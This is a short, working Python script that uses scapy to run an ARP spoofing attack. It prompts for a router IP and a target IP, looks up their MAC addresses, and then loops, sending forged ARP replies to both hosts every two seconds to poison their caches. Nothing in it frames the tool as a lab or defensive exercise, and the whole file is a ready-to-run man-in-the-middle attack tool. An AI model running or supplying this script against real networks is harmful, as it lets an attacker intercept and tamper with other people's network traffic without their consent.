from scapy import all as scapy
import sys
import time
import discoverHosts

def get_mac_address(ip_address):
    broadcat_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcat_layer / arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc


def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.send(packet1)
    scapy.send(packet2)



print(discoverHosts.getIPs())

router_ip = str(input("Enter router IP address: "))
target_ip = str(input("Enter target IP address: "))
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))



try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('[+] Closing the ARP Spoofer.')
    sys.exit(0)
